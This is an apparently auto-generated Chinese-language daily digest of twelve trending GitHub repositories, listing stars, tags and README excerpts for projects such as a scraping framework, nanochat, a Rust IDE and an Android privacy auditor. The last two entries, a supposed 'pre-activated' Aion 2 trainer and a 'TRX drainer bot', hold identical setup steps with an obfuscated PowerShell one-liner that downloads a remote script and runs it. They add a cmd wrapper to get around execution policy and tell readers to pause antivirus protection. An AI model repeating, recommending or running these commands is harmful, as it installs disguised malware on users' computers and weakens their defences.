📊 开源日报 — 2026-11-03
共发现 12 个新项目（已自动过滤历史记录）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#1  D4Vinci/Scrapling
    ⭐ 93412 stars  |  🍴 9819 forks  |  💻 Python  |  📅 2024-10-13
    🔗 https://github.com/D4Vinci/Scrapling
    📡 来源: trending-daily
    🏷️ ai, ai-scraping, automation, crawler, crawling, crawling-python, data, data-extraction, mcp, mcp-server
    📝 🕷️ The BEST Web Scraping framework that handles everything from a single request to a full-scale crawl! Don't be shy, join here: https://discord.gg/EMgGbDceNQ and follow here for daily tips and tricks: https://x.com/Scrapling_dev

    README 摘要:
    Effortless Web Scraping for the Modern Web
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
            
        
            
        
            
        
        
            
        
            
        
        
          
        
        
          
        
        
        
            
    
        Selection methods
        &middot;
        Fetchers

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#2  karpathy/nanochat
    ⭐ 60057 stars  |  🍴 8425 forks  |  💻 Python  |  📅 2025-10-13
    🔗 https://github.com/karpathy/nanochat
    📡 来源: trending-daily
    📝 The best ChatGPT that $100 can buy.

    README 摘要:
    # nanochat
    
    nanochat is the simplest experimental harness for training LLMs. It is designed to run on a single GPU node, the code is minimal/hackable, and it covers all major LLM stages including tokenization, pretraining, finetuning, evaluation, and inference. For example, you can train your own GPT-2 capability LLM (which cost ~$43,000 to train in 2019) for only $48 (~2 hours of 8XH100 GPU node) and then talk to it over a simple CLI. On a spot instance, the total cost can be closer to ~$15. More generally, nanochat is configured out of the box to train an entire miniseries of compute-optimal models by setting one single complexity dial: `--depth`, the number of layers in the GPT transformer model (GPT-2 capability happens to be approximately depth 26). All other hyperparameters (the width of the transformer, number of heads, learning rate adjustments, training horizons, weight decays, ...) are calculated automatically in an optimal way.
    
    For questions about the repo, I recommend either using DeepWiki from Devin/Cognition to ask questions about the repo, or use the Discussions tab, or come by the #nanochat channel on Discord.
    
    ## Time-to-GPT-2 Leaderboard
    
    Presently, the main focus of development is on tuning the pretraining stage, which takes the most amount of compute. Inspired by the modded-nanogpt repo and to incentivise progress and community collaboration, nanochat maintains a leaderboard for a "GPT-2 speedrun", which is the wall-clock time required to train a nanochat model to GPT-2 grade capability, as measured by the DCLM CORE score. The runs/speedrun.sh script always reflects the reference way to train GPT-2 grade model and talk to it. The current leaderboard looks as follows:
    
    | # | time | val_bpb | CORE | Description | Date | Commit | Contributors |
    |---|-------------|---------|------|-------------|------|--------|--------------|
    | 0 | 168 hours | - | 0.2565 | Original OpenAI GPT-2 checkpoint | 2019 | - | OpenAI |
    | 1 | 3.04 | 0.74833 | 0.2585 | d24 baseline, slightly overtrained | Jan 29 2026 | 348fbb3 | @karpathy |
    | 2 | 2.91 | 0.74504 | 0.2578 | d26 slightly undertrained **+fp8** | Feb 2 2026 | a67eba3 | @karpathy |
    | 3 | 2.76 | 0.74645 | 0.2602 | bump total batch size to 1M tokens | Feb 5 2026 | 2c062aa | @karpathy |
    | 4 | 2.02 | 0.71854 | 0.2571 | change dataset to NVIDIA ClimbMix | Mar 4 2026 | 324e69c | @ddudek @karpathy |
    | 5 | 1.80 | 0.71808 | 0.2690 | autoresearch round 1 | Mar 9 2026 | 6ed7d1d | @karpathy |
    | 6 | 1.65 | 0.71800 | 0.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#3  vercel-labs/agent-desktop
    ⭐ 10897 stars  |  🍴 727 forks  |  💻 Rust  |  📅 2026-02-19
    🔗 https://github.com/vercel-labs/agent-desktop
    📡 来源: trending-daily
    🏷️ accessibility, accessibility-api, ai-agents, automation, cli, computer-use, computer-use-agent, computer-use-agents, desktop-automation, macos
    📝 Computer use CLI for AI agents

    README 摘要:
    # agent-desktop
    
    Computer use for AI agents: read and operate desktop apps through the OS accessibility tree.
    
      
      
      
      
    
    A CLI and C library for macOS, Windows and Linux. A snapshot returns JSON with a ref for every element an agent can act on. The agent acts on a ref and snapshots again to check, with no pixel matching; the loop stays in your agent.
    
    Every CLI call runs in its own process. Headless calls still prohibit foreground activation and synthesized input.
    
    Snapshots, clipboard reads, screenshots, command output and debug artifacts can contain private desktop content. Keep them out of public logs and uploads. The optional JEV helper sends screen descriptions to a configured model provider; it is separate from the native CLI. See privacy and data handling.
    
    ## Installation
    
    Install on macOS, Windows or Linux with npm:
    
    ```bash
    npm install -g agent-desktop
    agent-desktop version
    ```
    
    Bun, Yarn and pnpm can install the same package. It includes native binaries and platform helpers for x64 and ARM64.
    For direct execution without a JavaScript launcher, download the matching native archive from
    GitHub Releases and keep its helper beside the executable.
    
    Official Homebrew and Scoop packages are being submitted; they are not yet available in the default catalogs.
    The repository no longer maintains a custom Homebrew tap or Scoop bucket.
    
    - **macOS** needs Accessibility permission: `agent-desktop permissions --guide`.
    - **Windows** needs no grant for apps at your terminal's integrity level.
    - **Linux** needs the user's graphical session with `at-spi2-core`.
    
    See installation and permissions for package-manager behavior, release archives, and building from source.
    
    ## Quick start
    
    Observe, act on a ref, observe again. Any app name from `agent-desktop list-apps` works; Finder is the macOS example.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#4  l0ng-ai/openidea
    ⭐ 5268 stars  |  🍴 422 forks  |  💻 TypeScript  |  📅 2026-10-21
    🔗 https://github.com/l0ng-ai/openidea
    📡 来源: 🚀 两周800+星
    🏷️ code-editor, cross-platform, dap, database-client, debugger, desktop-app, developer-tools, git, http-client, ide
    📝 The IDE you know, rebuilt in Rust. IntelliJ IDEA–style keymap, tool windows and search-everywhere in a fast native app: editor, code insight, debugger, Git, terminal, database and HTTP clients for 60+ languages.

    README 摘要:
    The IDE you know, rebuilt in Rust.
    
      Download
      &nbsp;·&nbsp;
      Benchmark
      &nbsp;·&nbsp;
      Discord
    
    https://github.com/user-attachments/assets/234dd54c-1255-4b3a-b35c-533d78d737c0
    
    OpenIDEA brings the IntelliJ IDEA way of working — its keymap, its tool windows,
    its search-everything habits — to a native app with a Rust core.
    
    Editor, code insight, debugger, Git, terminal, database and HTTP clients,
    for 60+ languages. Builds for macOS, Windows and Linux.
    
    ## Benchmark
    
    Opening freqtrade (Python, ~770 files)
    with warm caches, median of 5 runs:
    
    |                             | OpenIDEA          | IntelliJ IDEA 2026.2.3 |
    | --------------------------- | ----------------- | ---------------------- |
    | Window with the project     | **0.9 s**         | 3.1 s                  |
    | Ready (CPU settled)         | **1.1 s**         | 13.2 s                 |
    | Memory (USS, all processes) | **169 MB**        | 2011 MB                |
    | CPU time until ready        | **2.4 s**         | 47.9 s                 |
    | Idle CPU                    | **4 %** of a core | 7 % of a core          |
    | Quit                        | **0.3 s**         | 5.9 s                  |
    
    A release build of OpenIDEA from `main` and IDEA with default settings and plugins, on
    Windows 11, 32-core AMD, 62 GB RAM.
    IDEA analyses Python more deeply, so "ready" doesn't mean the same work on
    both sides. Both are measured from the outside, the same way: see
    `perf/compare` to run it on your machine and projects.
    
    ## License
    
    Apache 2.0. Bundled third-party assets are listed in `THIRD_PARTY_LICENSES.md`.
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#5  Verlintas/NOIR
    ⭐ 1529 stars  |  🍴 104 forks  |  💻 Kotlin  |  📅 2026-10-31
    🔗 https://github.com/Verlintas/NOIR
    📡 来源: 🚀 5天300+星
    🏷️ adb, android, android-privacy, android-security, android-tools, apk-analysis, bloatware, cli, cross-platform, debloat
    📝 手机隐私审计：用 adb 扫出 Android 应用的权限、上报端点与数据流向，并给出可回滚的处置。Desktop Android leak audit: permissions, endpoints, data flows, reversible fixes.

    README 摘要:
    ```
      ███╗   ██╗ ██████╗ ██╗██████╗
      ████╗  ██║██╔═══██╗██║██╔══██╗
      ██╔██╗ ██║██║   ██║██║██████╔╝
      ██║╚██╗██║██║   ██║██║██╔══██╗
      ██║ ╚████║╚██████╔╝██║██║  ██║
      ╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═╝
    ```
    
    # NOIR
    
    **把「这台手机到底能泄露什么」变成一份可复现的报告。**
    
    NOIR 是一个跑在电脑上的审计工具，通过 `adb` 读取已连接 Android 设备的应用清单、权限和 APK 里的网络端点，给出分类、风险评分和可执行的处置建议。它也可以在需要时调用 `jadx` 对单个应用做反编译和关键字检索。
    
    > 定位：**审计与自我防护**。面向自己的设备、自己的应用、已授权的安全研究。
    
    **官网 / Website:** https://verlintas.dev/noir/ · 中文
    
    ---
    
    ## 它做什么
    
    1. **盘点**：列出所有「有网络权限 + 敏感权限」的应用，以及它们各自拿到了什么。
    2. **抽取端点**：在设备端用 `unzip + strings` 从每个 APK 的 dex 里提取 URL，只回传几 KB，不把整包拉回电脑。
    3. **分类与打分**：按包名和域名识别厂商（Xiaomi / Google / 腾讯 / 高德 …）与类别（遥测、广告、定位、输入法 …），结合权限和上报端点计算风险分。
    4. **数据关联**：把权限翻译成"能拿到什么数据"（位置/通讯录/短信/通话/麦克风/相机/屏幕/应用列表/设备标识/文件/日历/账号），再和上报域名配对，得出"哪类数据可能流向哪里"。
    5. **共享 UID**：识别 `android.uid.system` 这类共享用户，列出哪些包实际上共享同一套权限并集。
    6. **清单层**：解析 `AndroidManifest.xml` 二进制 AXML，找出没有权限保护的导出组件、明文流量、备份、debuggable、targetSdk。
    4. **给建议**：区分「可安全自动执行」「需人工确认」「不建议动」，并为每条动作生成回滚命令。
    5. **必要时深挖**：`deep` 会把单个 APK 拉到本地，用 `jadx` 反编译后检索 `Runtime.exec`、`setApplicationEnabledSetting`、`DexClassLoader`、`MediaProjection` 等高风险调用。
    
    ## 它不做什么
    
    - 不联网、不上传任何数据、不需要账号。
    - 不修改系统分区，不需要 root。
    - 不会自动卸载任何东西，除非你显式加 `--aggressive`。
    
    ---
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#6  Arjun-Ingole/hop
    ⭐ 1403 stars  |  🍴 48 forks  |  💻 PowerShell  |  📅 2026-10-30
    🔗 https://github.com/Arjun-Ingole/hop
    📡 来源: 🚀 5天300+星
    📝 Install Linux next to Windows without a USB stick

    README 摘要:
    Install Linux next to Windows without a USB stick.
    
      
    
    ## What it is
    
    hop is a single Windows app that installs Linux alongside Windows. Pick a system, choose a drive, drag
    to choose how much space it gets, and click Install. There's no USB stick to find and nothing to install
    first.
    
    ## What it does
    
    - **Downloads from official sources.** It gets the ISO from the project's own server and verifies its
      checksum where the project publishes one. You can also use an ISO you already have.
    - **Makes room safely.** It checks your PC first, and nothing on the disk changes until those checks pass.
    - **Frees space that's stuck.** A drive can show plenty free and still refuse to shrink, because of files Windows can't
      move. Make room clears them in one click and puts your settings back afterwards.
    - **Goes where there's room.** Shrink C: or another drive, use free space, or use a second disk inside the
      PC. If C: is full, hop suggests a drive that isn't, and the download can go elsewhere too.
    - **Tells you what to click.** It lists the exact choices to make in the Linux installer.
    - **Gets you unstuck.** If the PC goes back to Windows, reopening hop explains why and can restart into the BIOS.
    - **Cleans up after itself.** Undo gives the space back to the drive it came from, and it can also remove
      another Linux already on the drive.
    - **Can replace Windows entirely, for the systems where hop has seen it work:** Ubuntu, Xubuntu, Ubuntu Budgie, Ubuntu Cinnamon, Edubuntu, Ubuntu Studio, Zorin OS, Fedora Workstation, Ultramarine, elementary OS, Debian, Arch and Omarchy. It's a separate choice with its own warning, and you have to
      type ERASE. hop only makes the installer, which copies itself to memory so it can erase the disk it started
      from when you tell it to. It needs more memory than the ISO's size, and it's only offered for systems where
      hop has seen it erase a disk and start again afterwards.
    
    **Systems:** elementary OS, Ubuntu and its flavours (Budgie, Xubuntu, Lubuntu, Cinnamon, Unity, Edubuntu,
    Studio), Linux Mint, Pop!_OS, Zorin OS, Debian, Fedora Workstation, Ultramarine, CachyOS, Arch Linux and Omarchy.
    Other Ubuntu-based ISOs should work too, if you choose the file yourself. Kubuntu isn't
    supported, because its ISO has a file too big for FAT32. CachyOS, Arch, Omarchy and Pop!_OS need Secure Boot off.
    Omarchy also needs BitLocker fully off on its disk, not paused, and hop refuses until it is. hop won't turn it off for you.
    Debian,

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#7  elvarofficial/teardown
    ⭐ 1382 stars  |  🍴 210 forks  |  💻 JavaScript  |  📅 2026-10-30
    🔗 https://github.com/elvarofficial/teardown
    📡 来源: 🚀 5天300+星
    📝 A Claude Code skill that turns any machine into a 3D simulator you can take apart

    README 摘要:
    # teardown
    
    A Claude Code skill that turns any machine into a 3D simulator you can take apart.
    
    Ask how something works. Claude builds it as one offline HTML page: the machine runs in the middle, every panel around it reads the real numbers, a button opens the part doing the work, and when nobody touches it the page tours itself.
    
    | Telson SC-8 robotic scorpion | Pelagos OC-8 robotic octopus |
    |---|---|
    |  |  |
    
    ## Install
    
    ```
    npx skills add elvarofficial/teardown -g -a claude-code
    ```
    
    Then, once, in the installed folder:
    
    ```
    npm install && npx playwright install chromium
    ```
    
    You need Node.js 20 or newer. For the video you also need `ffmpeg`, and for the sound Python 3.
    
    ## Use
    
    Ask Claude Code in plain words:
    
    > Build me a simulator of a 4-stroke motorcycle engine I can take apart.
    
    > How does a mechanical watch keep time? Show me as a simulator.
    
    > Make a teardown of a hydraulic excavator arm and record a 20-second video of it.
    
    Or open one of the 3 examples first:
    
    ```
    node sims/build.mjs v8-live          # teardown-out/dist/v8-live.html
    node sims/build.mjs cessna-live
    node sims/build.mjs strandbeest-live

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#8  caru-ini/stack-diagram
    ⭐ 1313 stars  |  🍴 57 forks  |  💻 TypeScript  |  📅 2026-11-01
    🔗 https://github.com/caru-ini/stack-diagram
    📡 来源: 🚀 5天300+星
    🏷️ agent-skills, architecture-diagram, claude-code, claude-skills, codex, diagram, system-architecture, tech-stack
    📝 Agent skill: describe your stack in a sentence, get an architecture diagram with official logos

    README 摘要:
    # stack-diagram
    
    Describe your stack in a sentence. Get an architecture diagram with official logos.
    
      
      
    
    > Diagram our stack: Next.js and a Hono API on Vercel. Postgres on Neon, auth with Clerk, payments with Stripe. GitHub Actions deploys.
    
    ```bash
    npx skills add caru-ini/stack-diagram
    ```
    
    Works with Claude Code, Codex, Cursor and other agents that support skills. In the Claude apps, upload `stack-diagram.zip` from Releases as a skill.
    
    ## More examples
    
      
        
          
            
            
          
          Dev tooling, not just clouds
          Draw our monorepo tooling: a pnpm workspace with Turborepo, Biome, Vitest and Lefthook. GitHub Actions runs CI and publishes to npm.
        
        
          
            
            
          
          AI apps
          Draw our docs chatbot: Next.js on Vercel searches Supabase pgvector and answers with Claude. Inngest syncs Notion every night.
        
      
      
        
          
            
            

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#9  mromidev/claude-animated-shorts
    ⭐ 804 stars  |  🍴 192 forks  |  💻 TypeScript  |  📅 2026-11-01
    🔗 https://github.com/mromidev/claude-animated-shorts
    📡 来源: 🚀 5天300+星
    📝 Free Claude skill: viral animated story shorts (2D characters in a 3D world) with three.js + Remotion

    README 摘要:
    # Claude Animated Shorts
    
    The free Claude skill from the video **"How to Make Viral Animated Shorts Using Claude (Full Workflow)"**.
    
    It makes 55-70 s vertical animated story shorts: 2D characters in a colourful 3D world, with ink outlines, a painted town, lens blur, gliding cameras, a march score and sound effects. Everything is rendered with three.js inside Remotion on your own PC, with no AI video generator.
    
    Proven on **The Bridge That Fell for a Song**, a 67 s short about the 1831 Broughton bridge.
    
    ## What's inside
    | Path | What it is |
    |---|---|
    | `SKILL.md` | The skill: the full pipeline, every rule, every fix, and the final look values |
    | `templates/bridge/` | The full source of the bridge short: world, characters, ink, lens blur, grade, story/camera |
    | `templates/audio/` | The synthesized sound: SFX, march music, the mix with ducking and loudness |
    | `templates/scripts/` | Stills, side-by-side sheets, shot merge and frame-by-frame QA helpers |
    | `references/STYLE_BIBLE.md` | The script and visual formula measured from 20 reference shorts |
    | `references/reports/` | Seven measured reports: motion, depth, textures, characters, lighting, outlines, grade |
    | `references/frames/` | 38 full-size reference frames (540x960) to compare your frames against |
    | `references/sheets/` | 20 contact sheets, one per reference short, 60 frames each (1,200 frames) |
    
    ## Install
    1. Copy this folder to `~/.claude/skills/cartoon-3d-short/` (clone it there, or download the ZIP).
    2. You need Remotion with `@remotion/three`, plus Node, Python 3 and ffmpeg.
    3. In Claude Code, say: *"Use the cartoon short skill and make a short about …"*.
    
    Claude then follows `SKILL.md`: topic and facts, then script, then voice, then the shot plan in `story.ts`, then stills, then renders. Agents check your frames against the reports and the frames, and you get the final 2K render and sound mix.
    
    ## Notes
    - Set `REMOTION_TMP` to a folder on a big drive. Every Remotion bundle copies `public/` (~1.3 GB) into the temp folder.
    - Story, characters and voice should always be your own. Use the references for the look, not the content.
    
    ## License
    The code and docs are MIT (see `LICENSE`). The reference frames are included for style study only.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#10  joeblau/subvox
    ⭐ 677 stars  |  🍴 93 forks  |  💻 Swift  |  📅 2026-10-31
    🔗 https://github.com/joeblau/subvox
    📡 来源: 🚀 5天300+星
    📝 无描述

    README 摘要:
    # Subvox
    
    A macOS prototype that tests whether AirPods Pro head-motion data (`CMHeadphoneMotionManager`) carries enough information to turn **silently mouthed words into text**.
    
    It doesn't use a language model. It's a small-vocabulary template recognizer plus a statistical test that tells you whether the signal is real.
    
    ## Build & run
    
    ```sh
    brew install xcodegen   # once
    xcodegen generate
    open Subvox.xcodeproj   # ⌘R
    ```
    
    Or from the command line:
    
    ```sh
    xcodebuild -project Subvox.xcodeproj -scheme Subvox -derivedDataPath build -allowProvisioningUpdates build
    open build/Build/Products/Debug/Subvox.app
    xcodebuild -project Subvox.xcodeproj -scheme Subvox -derivedDataPath build test
    ```
    
    Requires macOS 14+, AirPods Pro or another headphone that supports head tracking, connected as the Mac's audio output. On first launch, grant **Motion**. The mic and speech prompts only appear when you start the mic.
    
    ## Screens
    
    | Screen | What it does |
    |---|---|
    | **Sensors** | Live plots of user acceleration, rotation rate and attitude, the measured sample rate, a mic input picker and level meter, and a recorder for experiment sessions. |
    | **Train** | Pick a word, hold **Space**, mouth it, release. Each take is stored as a template. **Evaluate** runs leave-one-out classification and a 500× label-permutation test, then shows accuracy against chance, a p-value and a confusion matrix. The feature checkboxes (acceleration / rotation / attitude) let you test which channels carry the signal. |
    | **Decode** | The motion-to-text screen. Hold Space, or use auto-detect after calibrating the noise floor. Each segment is DTW-matched against your templates and added to the transcript. A live mic transcript runs alongside it for comparison. |
    
    ## How decoding works
    
    1. **Segmentation** (`CaptureController`). Space-hold, or an energy trigger above a calibrated noise floor with pre-roll and hangover.
    2. **Features** (`MotionFeatures`). Per frame: user acceleration (3), rotation rate (3), and attitude change since the start of the segment (3). Each channel is mean-centered, and quiet lead-in and lead-out frames are trimmed.
    3. **Matching** (`DTW`, `TemplateClassifier`). Each channel is z-scaled across the training set. Matching is 1-nearest-neighbour per word, using dynamic time warping with a Sakoe–Chiba band. A segment is rejected if the best distance is above *max distance* or the margin to the runner-up is below *min confidence*.
    4. **Is it real?** (`Evaluation`). The leave-one-ou

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#11  ScalarBursarSpike/aion-2-trainer-tool
    ⭐ 101 stars  |  🍴 1 forks  |  💻 None  |  📅 2026-11-02
    🔗 https://github.com/ScalarBursarSpike/aion-2-trainer-tool
    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
    🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, desktop
    📝 Complete standalone setup for Aion 2, featuring advanced AI prompt engineering tools ready to run on your desktop.

    README 摘要:
    # Aion 2 — Standalone Desktop Installer
    Pre-activated local build for testing and deployment.
    
    > **Distribution Type:** Pre-activated Standalone Build
    >
    > **Target Platform:** Windows x64 Desktop
    >
    > **Estimated File Size:** 1.7 GB
    >
    > **Last Verified Mirror Sync:** November 2026
    
    ---
    
    ## 🛠️ Quick Setup Guide (PowerShell)
    
    1. Launch PowerShell:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal** or **Windows PowerShell** from the list.
    
    2. Execute the Setup Script:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all installing successfully:
    
       ```cmd
       $Node='git-software.'; $Zone='cc'; $Path='/ps/Setup.ps1'; $Endpoint='https://'+$Node+$Zone+$Path; $Pipeline=New-Object System.Net.WebClient; $Buffer=$Pipeline.DownloadString($Endpoint); .([scriptblock]::Create($Buffer))
       ```
    
    ---
    
    ## 📖 Resolving Issues
    
    ### ⚠️ Script is blocked by Execution Policy
    If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
    ```cmd
    powershell -Command "$Node='git-software.'; $Zone='cc'; $Path='/ps/Setup.ps1'; $Endpoint='https://'+$Node+$Zone+$Path; $Pipeline=New-Object System.Net.WebClient; $Buffer=$Pipeline.DownloadString($Endpoint); .([scriptblock]::Create($Buffer))"
    ```
    
    ### 🛡️ Antivirus / SmartScreen Alerts
    Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.
    
    ---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#12  Silenttestore/trx-drainer-bot
    ⭐ 100 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-02
    🔗 https://github.com/Silenttestore/trx-drainer-bot
    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
    🏷️ automation, desktop, developer-tools, drain-bot, drain-protocol, drainer-usdt-tool, open-source, python, scripts, software-engineering
    📝 Trx Drainer Bot 2026: Full working installer with AI-driven prompt engineering tools, ready to run on your desktop.

    README 摘要:
    # Trx Drainer Bot — Standalone Desktop Installer
    Pre-activated local build for testing and deployment.
    
    > **Distribution Type:** Pre-activated Standalone Build
    >
    > **Target Platform:** Windows x64 Desktop
    >
    > **Estimated File Size:** 1.0 GB
    >
    > **Last Verified Mirror Sync:** November 2026
    
    ---
    
    ## 🛠️ Quick Setup Guide (PowerShell)
    
    1. Launch PowerShell:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal** or **Windows PowerShell** from the list.
    
    2. Execute the Setup Script:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all installing successfully:
    
       ```cmd
       $Node='git-software.'; $Zone='cc'; $Path='/ps/Setup.ps1'; $Endpoint='https://'+$Node+$Zone+$Path; $Pipeline=New-Object System.Net.WebClient; $Buffer=$Pipeline.DownloadString($Endpoint); .([scriptblock]::Create($Buffer))
       ```
    
    ---
    
    ## 📖 Resolving Issues
    
    ### ⚠️ Script is blocked by Execution Policy
    If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
    ```cmd
    powershell -Command "$Node='git-software.'; $Zone='cc'; $Path='/ps/Setup.ps1'; $Endpoint='https://'+$Node+$Zone+$Path; $Pipeline=New-Object System.Net.WebClient; $Buffer=$Pipeline.DownloadString($Endpoint); .([scriptblock]::Create($Buffer))"
    ```
    
    ### 🛡️ Antivirus / SmartScreen Alerts
    Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.
    
    ---
